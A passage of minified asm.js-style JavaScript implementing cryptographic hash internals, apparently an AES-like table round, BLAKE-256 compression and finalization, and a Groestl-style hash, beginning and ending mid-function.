        l = c[16 + ((f & 255) << 2) >> 2] ^ c[b + 20 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (g >>> 24 << 2) >> 2];
        c[j >> 2] = l;
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 24 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((g >>> 16 & 255) << 2) >> 2] ^ c[3088 + (f >>> 24 << 2) >> 2];
        c[i >> 2] = h;
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 28 >> 2] ^ c[1040 + ((g >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((f >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        c[d >> 2] = m;
        f = c[16 + ((k & 255) << 2) >> 2] ^ c[b + 32 >> 2] ^ c[1040 + ((l >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        g = c[16 + ((l & 255) << 2) >> 2] ^ c[b + 36 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (k >>> 24 << 2) >> 2];
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 40 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((k >>> 16 & 255) << 2) >> 2] ^ c[3088 + (l >>> 24 << 2) >> 2];
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 44 >> 2] ^ c[1040 + ((k >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((l >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        l = c[16 + ((f & 255) << 2) >> 2] ^ c[b + 48 >> 2] ^ c[1040 + ((g >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        c[a >> 2] = l;
        k = c[16 + ((g & 255) << 2) >> 2] ^ c[b + 52 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (f >>> 24 << 2) >> 2];
        c[j >> 2] = k;
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 56 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((f >>> 16 & 255) << 2) >> 2] ^ c[3088 + (g >>> 24 << 2) >> 2];
        c[i >> 2] = m;
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 60 >> 2] ^ c[1040 + ((f >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((g >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        c[d >> 2] = e;
        g = c[16 + ((l & 255) << 2) >> 2] ^ c[b + 64 >> 2] ^ c[1040 + ((k >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        f = c[16 + ((k & 255) << 2) >> 2] ^ c[b + 68 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (l >>> 24 << 2) >> 2];
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 72 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((l >>> 16 & 255) << 2) >> 2] ^ c[3088 + (k >>> 24 << 2) >> 2];
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 76 >> 2] ^ c[1040 + ((l >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((k >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        k = c[16 + ((g & 255) << 2) >> 2] ^ c[b + 80 >> 2] ^ c[1040 + ((f >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        c[a >> 2] = k;
        l = c[16 + ((f & 255) << 2) >> 2] ^ c[b + 84 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (g >>> 24 << 2) >> 2];
        c[j >> 2] = l;
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 88 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((g >>> 16 & 255) << 2) >> 2] ^ c[3088 + (f >>> 24 << 2) >> 2];
        c[i >> 2] = e;
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 92 >> 2] ^ c[1040 + ((g >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((f >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        c[d >> 2] = h;
        f = c[16 + ((k & 255) << 2) >> 2] ^ c[b + 96 >> 2] ^ c[1040 + ((l >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        g = c[16 + ((l & 255) << 2) >> 2] ^ c[b + 100 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (k >>> 24 << 2) >> 2];
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 104 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((k >>> 16 & 255) << 2) >> 2] ^ c[3088 + (l >>> 24 << 2) >> 2];
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 108 >> 2] ^ c[1040 + ((k >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((l >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        l = c[16 + ((f & 255) << 2) >> 2] ^ c[b + 112 >> 2] ^ c[1040 + ((g >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        c[a >> 2] = l;
        k = c[16 + ((g & 255) << 2) >> 2] ^ c[b + 116 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (f >>> 24 << 2) >> 2];
        c[j >> 2] = k;
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 120 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((f >>> 16 & 255) << 2) >> 2] ^ c[3088 + (g >>> 24 << 2) >> 2];
        c[i >> 2] = h;
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 124 >> 2] ^ c[1040 + ((f >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((g >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        c[d >> 2] = m;
        g = c[16 + ((l & 255) << 2) >> 2] ^ c[b + 128 >> 2] ^ c[1040 + ((k >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (m >>> 24 << 2) >> 2];
        f = c[16 + ((k & 255) << 2) >> 2] ^ c[b + 132 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (l >>> 24 << 2) >> 2];
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 136 >> 2] ^ c[1040 + ((m >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((l >>> 16 & 255) << 2) >> 2] ^ c[3088 + (k >>> 24 << 2) >> 2];
        h = c[16 + ((m & 255) << 2) >> 2] ^ c[b + 140 >> 2] ^ c[1040 + ((l >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((k >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        c[a >> 2] = c[16 + ((g & 255) << 2) >> 2] ^ c[b + 144 >> 2] ^ c[1040 + ((f >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        c[j >> 2] = c[16 + ((f & 255) << 2) >> 2] ^ c[b + 148 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (g >>> 24 << 2) >> 2];
        c[i >> 2] = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 152 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((g >>> 16 & 255) << 2) >> 2] ^ c[3088 + (f >>> 24 << 2) >> 2];
        c[d >> 2] = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 156 >> 2] ^ c[1040 + ((g >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((f >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        return
    }

    function Ea(a, b) {
        a = a | 0;
        b = b | 0;
        var e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            y = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0;
        C = l;
        l = l + 128 | 0;
        v = C + 64 | 0;
        B = C;
        e = 0;
        do {
            A = b + (e << 2) | 0;
            c[B + (e << 2) >> 2] = (d[A + 1 >> 0] | 0) << 16 | (d[A >> 0] | 0) << 24 | (d[A + 2 >> 0] | 0) << 8 | (d[A + 3 >> 0] | 0);
            e = e + 1 | 0
        } while ((e | 0) != 16);
        c[v >> 2] = c[a >> 2];
        c[v + 4 >> 2] = c[a + 4 >> 2];
        c[v + 8 >> 2] = c[a + 8 >> 2];
        c[v + 12 >> 2] = c[a + 12 >> 2];
        c[v + 16 >> 2] = c[a + 16 >> 2];
        c[v + 20 >> 2] = c[a + 20 >> 2];
        c[v + 24 >> 2] = c[a + 24 >> 2];
        c[v + 28 >> 2] = c[a + 28 >> 2];
        x = a + 32 | 0;
        h = c[x >> 2] ^ 608135816;
        c[v + 32 >> 2] = h;
        y = a + 36 | 0;
        i = c[y >> 2] ^ -2052912941;
        c[v + 36 >> 2] = i;
        z = a + 40 | 0;
        j = c[z >> 2] ^ 320440878;
        c[v + 40 >> 2] = j;
        A = a + 44 | 0;
        w = c[A >> 2] ^ 57701188;
        c[v + 44 >> 2] = w;
        e = v + 48 | 0;
        c[e >> 2] = -1542899678;
        b = v + 52 | 0;
        c[b >> 2] = 698298832;
        f = v + 56 | 0;
        c[f >> 2] = 137296536;
        g = v + 60 | 0;
        c[g >> 2] = -330404727;
        if (!(c[a + 60 >> 2] | 0)) {
            t = c[a + 48 >> 2] | 0;
            s = t ^ -1542899678;
            c[e >> 2] = s;
            t = t ^ 698298832;
            c[b >> 2] = t;
            e = c[a + 52 >> 2] | 0;
            u = e ^ 137296536;
            c[f >> 2] = u;
            e = e ^ -330404727;
            c[g >> 2] = e;
            g = e;
            e = s;
            b = t;
            f = u
        } else {
            g = -330404727;
            e = -1542899678;
            b = 698298832;
            f = 137296536
        }
        s = 0;
        t = c[v + 16 >> 2] | 0;
        u = c[v >> 2] | 0;
        q = c[v + 20 >> 2] | 0;
        r = c[v + 4 >> 2] | 0;
        n = i;
        o = c[v + 24 >> 2] | 0;
        p = c[v + 8 >> 2] | 0;
        m = f;
        k = c[v + 28 >> 2] | 0;
        i = c[v + 12 >> 2] | 0;
        f = w;
        do {
            S = d[7471 + (s << 4) >> 0] | 0;
            R = d[7471 + (s << 4) + 1 >> 0] | 0;
            I = (c[4704 + (R << 2) >> 2] ^ c[B + (S << 2) >> 2]) + t + u | 0;
            D = e ^ I;
            D = D << 16 | D >>> 16;
            J = D + h | 0;
            O = J ^ t;
            O = O << 20 | O >>> 12;
            I = (c[4704 + (S << 2) >> 2] ^ c[B + (R << 2) >> 2]) + O + I | 0;
            D = D ^ I;
            D = D << 24 | D >>> 8;
            J = D + J | 0;
            O = O ^ J;
            O = O << 25 | O >>> 7;
            R = d[7471 + (s << 4) + 2 >> 0] | 0;
            S = d[7471 + (s << 4) + 3 >> 0] | 0;
            E = (c[4704 + (S << 2) >> 2] ^ c[B + (R << 2) >> 2]) + q + r | 0;
            L = b ^ E;
            L = L << 16 | L >>> 16;
            N = L + n | 0;
            G = N ^ q;
            G = G << 20 | G >>> 12;
            E = (c[4704 + (R << 2) >> 2] ^ c[B + (S << 2) >> 2]) + G + E | 0;
            L = L ^ E;
            L = L << 24 | L >>> 8;
            N = L + N | 0;
            G = G ^ N;
            G = G << 25 | G >>> 7;
            S = d[7471 + (s << 4) + 4 >> 0] | 0;
            R = d[7471 + (s << 4) + 5 >> 0] | 0;
            M = (c[4704 + (R << 2) >> 2] ^ c[B + (S << 2) >> 2]) + o + p | 0;
            P = m ^ M;
            P = P << 16 | P >>> 16;
            F = P + j | 0;
            w = o ^ F;
            w = w << 20 | w >>> 12;
            M = (c[4704 + (S << 2) >> 2] ^ c[B + (R << 2) >> 2]) + w + M | 0;
            P = P ^ M;
            P = P << 24 | P >>> 8;
            F = P + F | 0;
            w = w ^ F;
            w = w << 25 | w >>> 7;
            R = d[7471 + (s << 4) + 6 >> 0] | 0;
            S = d[7471 + (s << 4) + 7 >> 0] | 0;
            Q = (c[4704 + (S << 2) >> 2] ^ c[B + (R << 2) >> 2]) + k + i | 0;
            H = g ^ Q;
            H = H << 16 | H >>> 16;
            v = H + f | 0;
            K = k ^ v;
            K = K << 20 | K >>> 12;
            Q = (c[4704 + (R << 2) >> 2] ^ c[B + (S << 2) >> 2]) + K + Q | 0;
            H = H ^ Q;
            H = H << 24 | H >>> 8;
            v = H + v | 0;
            K = K ^ v;
            K = K << 25 | K >>> 7;
            S = d[7471 + (s << 4) + 14 >> 0] | 0;
            R = d[7471 + (s << 4) + 15 >> 0] | 0;
            Q = (c[4704 + (R << 2) >> 2] ^ c[B + (S << 2) >> 2]) + O + Q | 0;
            P = P ^ Q;
            P = P << 16 | P >>> 16;
            N = P + N | 0;
            O = O ^ N;
            O = O << 20 | O >>> 12;
            i = (c[4704 + (S << 2) >> 2] ^ c[B + (R << 2) >> 2]) + O + Q | 0;
            P = P ^ i;
            m = P << 24 | P >>> 8;
            n = m + N | 0;
            O = O ^ n;
            t = O << 25 | O >>> 7;
            O = d[7471 + (s << 4) + 12 >> 0] | 0;
            N = d[7471 + (s << 4) + 13 >> 0] | 0;
            M = (c[4704 + (N << 2) >> 2] ^ c[B + (O << 2) >> 2]) + K + M | 0;
            L = L ^ M;
            L = L << 16 | L >>> 16;
            J = L + J | 0;
            K = K ^ J;
            K = K << 20 | K >>> 12;
            p = (c[4704 + (O << 2) >> 2] ^ c[B + (N << 2) >> 2]) + K + M | 0;
            L = L ^ p;
            b = L << 24 | L >>> 8;
            h = b + J | 0;
            K = K ^ h;
            k = K << 25 | K >>> 7;
            K = d[7471 + (s << 4) + 8 >> 0] | 0;
            J = d[7471 + (s << 4) + 9 >> 0] | 0;
            I = (c[4704 + (J << 2) >> 2] ^ c[B + (K << 2) >> 2]) + G + I | 0;
            H = H ^ I;
            H = H << 16 | H >>> 16;
            F = H + F | 0;
            G = G ^ F;
            G = G << 20 | G >>> 12;
            u = (c[4704 + (K << 2) >> 2] ^ c[B + (J << 2) >> 2]) + G + I | 0;
            H = H ^ u;
            g = H << 24 | H >>> 8;
            j = g + F | 0;
            G = G ^ j;
            q = G << 25 | G >>> 7;
            G = d[7471 + (s << 4) + 10 >> 0] | 0;
            F = d[7471 + (s << 4) + 11 >> 0] | 0;
            E = (c[4704 + (F << 2) >> 2] ^ c[B + (G << 2) >> 2]) + w + E | 0;
            D = D ^ E;
            D = D << 16 | D >>> 16;
            v = D + v | 0;
            w = w ^ v;
            w = w << 20 | w >>> 12;
            r = (c[4704 + (G << 2) >> 2] ^ c[B + (F << 2) >> 2]) + w + E | 0;
            D = D ^ r;
            e = D << 24 | D >>> 8;
            f = e + v | 0;
            w = w ^ f;
            o = w << 25 | w >>> 7;
            s = s + 1 | 0
        } while ((s | 0) != 14);
        O = a + 4 | 0;
        R = a + 8 | 0;
        G = a + 12 | 0;
        J = a + 16 | 0;
        M = a + 20 | 0;
        P = a + 24 | 0;
        S = a + 28 | 0;
        D = c[O >> 2] ^ r ^ n;
        E = c[R >> 2] ^ p ^ j;
        F = c[G >> 2] ^ i ^ f;
        H = c[J >> 2] ^ t ^ e;
        K = c[M >> 2] ^ q ^ b;
        N = c[P >> 2] ^ o ^ m;
        Q = c[S >> 2] ^ k ^ g;
        I = c[x >> 2] | 0;
        c[a >> 2] = c[a >> 2] ^ u ^ h ^ I;
        L = c[y >> 2] | 0;
        c[O >> 2] = D ^ L;
        O = c[z >> 2] | 0;
        c[R >> 2] = E ^ O;
        R = c[A >> 2] | 0;
        c[G >> 2] = F ^ R;
        c[J >> 2] = H ^ I;
        c[M >> 2] = K ^ L;
        c[P >> 2] = N ^ O;
        c[S >> 2] = Q ^ R;
        l = C;
        return
    }

    function Fa(a, b, d, e) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0;
        i = a + 56 | 0;
        g = c[i >> 2] >> 3;
        f = 64 - g | 0;
        if (g) {
            h = yb(d | 0, e | 0, 3) | 0;
            if (0 < 0 | 0 == 0 & (h & 63) >>> 0 < f >>> 0) f = d;
            else {
                Db(a + 64 + g | 0, b | 0, f | 0) | 0;
                g = a + 48 | 0;
                h = (c[g >> 2] | 0) + 512 | 0;
                c[g >> 2] = h;
                if (!h) {
                    h = a + 52 | 0;
                    c[h >> 2] = (c[h >> 2] | 0) + 1
                }
                Ea(a, a + 64 | 0);
                h = f << 3;
                h = vb(d | 0, e | 0, h | 0, ((h | 0) < 0) << 31 >> 31 | 0) | 0;
                b = b + f | 0;
                g = 0;
                e = y;
                f = h
            }
        } else {
            g = 0;
            f = d
        }
        if (e >>> 0 > 0 | (e | 0) == 0 & f >>> 0 > 511) {
            d = a + 48 | 0;
            h = a + 52 | 0;
            do {
                j = (c[d >> 2] | 0) + 512 | 0;
                c[d >> 2] = j;
                if (!j) c[h >> 2] = (c[h >> 2] | 0) + 1;
                Ea(a, b);
                b = b + 64 | 0;
                f = wb(f | 0, e | 0, -512, -1) | 0;
                e = y
            } while (e >>> 0 > 0 | (e | 0) == 0 & f >>> 0 > 511)
        }
        if ((f | 0) == 0 & (e | 0) == 0) {
            j = 0;
            c[i >> 2] = j;
            return
        }
        j = wb(g << 3 | 0, 0, f | 0, e | 0) | 0;
        h = yb(f | 0, e | 0, 3) | 0;
        Db(a + 64 + g | 0, b | 0, h | 0) | 0;
        c[i >> 2] = j;
        return
    }

    function Ga(b, d, e, f) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0;
        k = l;
        l = l + 16 | 0;
        h = k + 1 | 0;
        i = k;
        j = k + 8 | 0;
        a[h >> 0] = e;
        a[i >> 0] = f;
        g = b + 48 | 0;
        f = c[g >> 2] | 0;
        e = c[b + 56 >> 2] | 0;
        m = e + f | 0;
        n = (m >>> 0 < e >>> 0 & 1) + (c[b + 52 >> 2] | 0) | 0;
        a[j >> 0] = n >>> 24;
        a[j + 1 >> 0] = n >>> 16;
        a[j + 2 >> 0] = n >>> 8;
        a[j + 3 >> 0] = n;
        a[j + 4 >> 0] = m >>> 24;
        a[j + 5 >> 0] = m >>> 16;
        a[j + 6 >> 0] = m >>> 8;
        a[j + 7 >> 0] = m;
        if ((e | 0) == 440) {
            c[g >> 2] = f + -8;
            Fa(b, h, 8, 0);
            e = c[g >> 2] | 0
        } else {
            if ((e | 0) < 440) {
                if (!e) c[b + 60 >> 2] = 1;
                n = 440 - e | 0;
                c[g >> 2] = f - n;
                Fa(b, 7695, n, ((n | 0) < 0) << 31 >> 31)
            } else {
                n = 512 - e | 0;
                c[g >> 2] = f - n;
                Fa(b, 7695, n, ((n | 0) < 0) << 31 >> 31);
                c[g >> 2] = (c[g >> 2] | 0) + -440;
                Fa(b, 7696, 440, 0);
                c[b + 60 >> 2] = 1
            }
            Fa(b, i, 8, 0);
            e = (c[g >> 2] | 0) + -8 | 0;
            c[g >> 2] = e
        }
        c[g >> 2] = e + -64;
        Fa(b, j, 64, 0);
        a[d >> 0] = (c[b >> 2] | 0) >>> 24;
        a[d + 1 >> 0] = (c[b >> 2] | 0) >>> 16;
        a[d + 2 >> 0] = (c[b >> 2] | 0) >>> 8;
        a[d + 3 >> 0] = c[b >> 2];
        n = b + 4 | 0;
        a[d + 4 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 5 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 6 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 7 >> 0] = c[n >> 2];
        n = b + 8 | 0;
        a[d + 8 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 9 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 10 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 11 >> 0] = c[n >> 2];
        n = b + 12 | 0;
        a[d + 12 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 13 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 14 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 15 >> 0] = c[n >> 2];
        n = b + 16 | 0;
        a[d + 16 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 17 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 18 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 19 >> 0] = c[n >> 2];
        n = b + 20 | 0;
        a[d + 20 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 21 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 22 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 23 >> 0] = c[n >> 2];
        n = b + 24 | 0;
        a[d + 24 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 25 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 26 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 27 >> 0] = c[n >> 2];
        n = b + 28 | 0;
        a[d + 28 >> 0] = (c[n >> 2] | 0) >>> 24;
        a[d + 29 >> 0] = (c[n >> 2] | 0) >>> 16;
        a[d + 30 >> 0] = (c[n >> 2] | 0) >>> 8;
        a[d + 31 >> 0] = c[n >> 2];
        l = k;
        return
    }

    function Ha(a, b, d, e) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0;
        f = l;
        l = l + 128 | 0;
        g = f;
        c[g >> 2] = 1779033703;
        c[g + 4 >> 2] = -1150833019;
        c[g + 8 >> 2] = 1013904242;
        c[g + 12 >> 2] = -1521486534;
        c[g + 16 >> 2] = 1359893119;
        c[g + 20 >> 2] = -1694144372;
        c[g + 24 >> 2] = 528734635;
        c[g + 28 >> 2] = 1541459225;
        h = g + 32 | 0;
        c[h >> 2] = 0;
        c[h + 4 >> 2] = 0;
        c[h + 8 >> 2] = 0;
        c[h + 12 >> 2] = 0;
        c[h + 16 >> 2] = 0;
        c[h + 20 >> 2] = 0;
        c[h + 24 >> 2] = 0;
        c[h + 28 >> 2] = 0;
        e = zb(d | 0, e | 0, 3) | 0;
        Fa(g, b, e, y);
        Ga(g, a, -127, 1);
        l = f;
        return
    }

    function Ia(b, e, f, g) {
        b = b | 0;
        e = e | 0;
        f = f | 0;
        g = g | 0;
        var h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0;
        u = l;
        l = l + 336 | 0;
        p = u + 272 | 0;
        q = u + 208 | 0;
        r = u + 144 | 0;
        s = u;
        h = s;
        i = h + 60 | 0;
        do {
            c[h >> 2] = 0;
            h = h + 4 | 0
        } while ((h | 0) < (i | 0));
        t = s + 60 | 0;
        c[t >> 2] = 65536;
        o = s + 136 | 0;
        c[o >> 2] = 0;
        m = s + 64 | 0;
        c[m >> 2] = 0;
        n = s + 68 | 0;
        c[n >> 2] = 0;
        j = s + 140 | 0;
        c[j >> 2] = 0;
        f = yb(e | 0, f | 0, 3) | 0;
        i = e & 7;
        Ja(s, b, f);
        h = ((f | 0) / 64 | 0) << 6;
        if ((h | 0) < (f | 0))
            do {
                v = a[b + h >> 0] | 0;
                h = h + 1 | 0;
                e = c[o >> 2] | 0;
                c[o >> 2] = e + 1;
                a[s + 72 + e >> 0] = v
            } while ((h | 0) < (f | 0));
        else f = h;
        if (i | 0) {
            c[j >> 2] = i;
            b = a[b + f >> 0] | 0;
            v = c[o >> 2] | 0;
            c[o >> 2] = v + 1;
            a[s + 72 + v >> 0] = b
        }
        f = c[j >> 2] | 0;
        if (!f) {
            v = c[o >> 2] | 0;
            c[o >> 2] = v + 1;
            a[s + 72 + v >> 0] = -128
        } else {
            v = (c[o >> 2] | 0) + -1 + (s + 72) | 0;
            a[v >> 0] = (d[v >> 0] | 0) & (1 << f) + -1 << 8 - f;
            v = (c[o >> 2] | 0) + -1 + (s + 72) | 0;
            a[v >> 0] = (d[v >> 0] | 0) ^ 1 << 7 - (c[j >> 2] | 0);
            c[j >> 2] = 0
        }
        f = c[o >> 2] | 0;
        if ((f | 0) <= 56) {
            if ((f | 0) != 56) k = 13
        } else {
            if ((f | 0) < 64)
                do {
                    c[o >> 2] = f + 1;
                    a[s + 72 + f >> 0] = 0;
                    f = c[o >> 2] | 0
                } while ((f | 0) < 64);
            Ja(s, s + 72 | 0, 64);
            c[o >> 2] = 0;
            f = 0;
            k = 13
        }
        if ((k | 0) == 13)
            while (1) {
                c[o >> 2] = f + 1;
                a[s + 72 + f >> 0] = 0;
                f = c[o >> 2] | 0;
                if ((f | 0) >= 56) break;
                else k = 13
            }
        f = (c[m >> 2] | 0) + 1 | 0;
        c[m >> 2] = f;
        if (!f) c[n >> 2] = (c[n >> 2] | 0) + 1;
        c[o >> 2] = 64;
        i = 64;
        do {
            v = i + -1 | 0;
            c[o >> 2] = v;
            a[s + 72 + v >> 0] = f;
            f = f >>> 8;
            i = c[o >> 2] | 0
        } while ((i | 0) > 60);
        c[m >> 2] = f;
        if ((i | 0) > 56) {
            h = c[n >> 2] | 0;
            f = i;
            do {
                v = f + -1 | 0;
                c[o >> 2] = v;
                a[s + 72 + v >> 0] = h;
                h = h >>> 8;
                f = c[o >> 2] | 0
            } while ((f | 0) > 56);
            c[n >> 2] = h
        }
        Ja(s, s + 72 | 0, 64);
        h = p;
        f = s;
        i = h + 64 | 0;
        do {
            c[h >> 2] = c[f >> 2];
            h = h + 4 | 0;
            f = f + 4 | 0
        } while ((h | 0) < (i | 0));
        Ka(p, q, 0);
        Ka(q, r, 1);
        Ka(r, q, 2);
        Ka(q, r, 3);
        Ka(r, q, 4);
        Ka(q, r, 5);
        Ka(r, q, 6);
        Ka(q, r, 7);
        Ka(r, q, 8);
        Ka(q, p, 9);
        c[s >> 2] = c[s >> 2] ^ c[p >> 2];
        r = s + 4 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 4 >> 2];
        r = s + 8 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 8 >> 2];
        r = s + 12 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 12 >> 2];
        r = s + 16 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 16 >> 2];
        r = s + 20 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 20 >> 2];
        r = s + 24 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 24 >> 2];
        r = s + 28 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 28 >> 2];
        r = s + 32 | 0;
        k = c[r >> 2] ^ c[p + 32 >> 2];
        c[r >> 2] = k;
        r = s + 36 | 0;
        m = c[r >> 2] ^ c[p + 36 >> 2];
        c[r >> 2] = m;
        r = s + 40 | 0;
        n = c[r >> 2] ^ c[p + 40 >> 2];
        c[r >> 2] = n;
        r = s + 44 | 0;
        o = c[r >> 2] ^ c[p + 44 >> 2];
        c[r >> 2] = o;
        r = s + 48 | 0;
        q = c[r >> 2] ^ c[p + 48 >> 2];
        c[r >> 2] = q;
        r = s + 52 | 0;
        c[r >> 2] = c[r >> 2] ^ c[p + 52 >> 2];
        v = s + 56 | 0;
        c[v >> 2] = c[v >> 2] ^ c[p + 56 >> 2];
        c[t >> 2] = c[t >> 2] ^ c[p + 60 >> 2];
        a[g >> 0] = k;
        a[g + 1 >> 0] = k >>> 8;
        a[g + 2 >> 0] = k >>> 16;
        a[g + 3 >> 0] = k >>> 24;
        a[g + 4 >> 0] = m;
        a[g + 5 >> 0] = m >>> 8;
        a[g + 6 >> 0] = m >>> 16;
        a[g + 7 >> 0] = m >>> 24;
        a[g + 8 >> 0] = n;
